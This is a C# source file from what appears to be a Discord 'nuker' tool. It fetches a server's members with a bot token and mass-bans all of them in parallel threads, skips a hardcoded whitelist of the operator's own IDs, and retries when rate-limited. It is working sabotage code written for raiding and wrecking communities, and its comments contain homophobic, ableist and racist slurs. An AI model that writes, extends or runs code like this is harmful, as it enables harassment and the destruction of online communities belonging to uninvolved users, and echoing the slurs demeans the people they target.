using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Drawing;

using LithiumNukerV2;
using Veylib.CLIUI;
using Newtonsoft.Json;

namespace LithiumCore
{
    public class Users
    {
        private static Core core = Core.GetInstance();
        public void BanAll(bool banIds = false)
        {
            #region Vars for nuker
            List<string> members = new List<string>();
            List<string> whitelistedIds = new List<string> { "921558491255148615", "884903196340932659", "860891644169683014" };
            var loads = new List<List<string>>();
            #endregion

            #region If not ID nuking, check permissions for bot
            if (banIds)
              members = new List<string>(File.ReadAllLines("ids.txt"));
            else
              getMembers();

                whitelistedIds.Add((string) getUserInfo("@me").id);

            banMembers();

            #endregion

            dynamic getUserInfo(object UserId)
            {
                HttpWebRequest req = WebRequest.CreateHttp($"https://discord.com/api/v9/users/{UserId}");
                req.Headers.Add("Authorization", $"Bot {Settings.Token}");

                dynamic resp;

                try
                {
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd());
                }
                catch (WebException ex)
                {
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(ex.Response.GetResponseStream()).ReadToEnd());
                }

                core.WriteLine(Color.Lime, $"Got information on {resp.id}");

                return resp;
            }

            void getMembers()
            {
                core.WriteLine("Fetching members...");
                core.UpdateTitleStatus("Fetching members");

                HttpWebRequest req = WebRequest.CreateHttp($"https://discord.com/api/v9/guilds/{Settings.GuildId}/members?limit=1000");
                req.Headers.Add("Authorization", $"Bot {Settings.Token}");
                dynamic resp = null;

                try
                {
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd());
                }
                catch (WebException ex)
                {
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(ex.Response.GetResponseStream()).ReadToEnd());
                }

                Console.WriteLine(JsonConvert.SerializeObject(resp));

                Console.ForegroundColor = ConsoleColor.Red;
                if (resp == null)
                {
                    Console.WriteLine("No response somehow. Kinda gay ngl");
                    Environment.Exit(0);
                }
                else
                {
                    try
                    {
                        if (resp.code == 50001)
                        {
                            Console.WriteLine("Make sure to enable \"SERVER MEMBERS INTENT\" in the bot page, aborting.");
                            Environment.Exit(0);
                        }
                    }
                    catch { }
                }

                // Console.WriteLine(resp.ChildrenTokens.ToString());

                for (var x = 0; x < resp.Count; x++)
                {
                    try
                    {
                        members.Add(resp[x].user.id.ToString());
                    }
                    catch { }
                }
            }

            List<List<string>> delegateLoads()
            {
                loads = new List<List<string>>();

                for (int x = 0; x < Settings.Threads; x++)
                    loads.Add(new List<string>());
                for (int x = 0; x < members.Count; x++)
                    loads[x % Settings.Threads].Add(members[x]);

                return loads;
            }

            void banMembers()
            {
                List<List<string>> loads = delegateLoads();

                var cookies = new CookieContainer(); // idek if this does shit. was used to attempt speeding it up but i didnt check differences
                foreach (var load in loads)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Banning {load.Count} members in a load");

                    new Thread(() =>
                    {
                        // 3 attempts to ban everyone in the list
                        // for (var x = 0;x < 3;x++)
                        ban(load);
                    }).Start(); // actually start the thread
                }

                void ban(List<string> Load)
                {
                    int og = Load.Count;
                    while (true)
                    {
                        if (Load.Count == 0)
                            return;

                        string member = Load[0];

                        if (whitelistedIds.Contains(member))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine($"Skipped {member} [whitelisted]");
                            Load.Remove(member);
                            continue;
                        }

                        HttpWebRequest req = WebRequest.CreateHttp($"https://discord.com/api/v9/guilds/{Settings.GuildId}/bans/{member}");
                        req.Method = "PUT";
                        req.Headers.Add("Authorization", $"Bot {Settings.Token}");
                        req.CookieContainer = cookies;
                        req.Proxy = null;

                        // not even working LOL
                        // fr tho i need to check discord api docs, cba rn tho

                        // byte[] bytes = Encoding.UTF8.GetBytes("{\"reason\": \"lithium runs you\"}");
                        // req.GetRequestStream().Write(bytes, 0, bytes.Length);

                        dynamic resp = null;
                        string rawResp = null;
                        dynamic jsonResp;

                        try
                        {
                            resp = req.GetResponse();
                            rawResp = new StreamReader(resp.GetResponseStream()).ReadToEnd();
                        }
                        catch (WebException ex)
                        {
                            rawResp = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        // Console.WriteLine(rawResp);

                        if (rawResp != null && rawResp.ToString().Length > 0)
                        {
                            try
                            {
                                jsonResp = JsonConvert.DeserializeObject<dynamic>(rawResp);

                                if (jsonResp.message == "You are being rate limited.") // thats a tad bit homo
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"Ratelimited. Delayed {jsonResp.retry_after} seconds");
                                    // Thread.Sleep(jsonResp.retry_after * 1000);
                                    // x--; // give it another try
                                    continue;
                                }
                                else if (((string)jsonResp.message).Contains("Max number of bans for non-guild members have been exceeded. Try again later")) // wow thats so autistic i want to be racist
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("Discord's gay ass API is blocked all ID bans. You're gonna have to wait a while or make a new server to test in");
                                    Environment.Exit(0);
                                }
                            }
                            catch { }
                        }

                        int code = 0;
                        if (resp != null)
                            code = (int)((HttpWebResponse)resp).StatusCode;

                        if (code > 0)
                        {
                            if (code >= 200 && code < 300) // 2xx is success.
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"Banned {member}"); // very cool!

                                Load.Remove(member); // remove the member
                            }
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"Failed to ban {member}");
                            Load.Remove(member); // remove the member
                        }
                    }
                }
            }
        }
    }
}
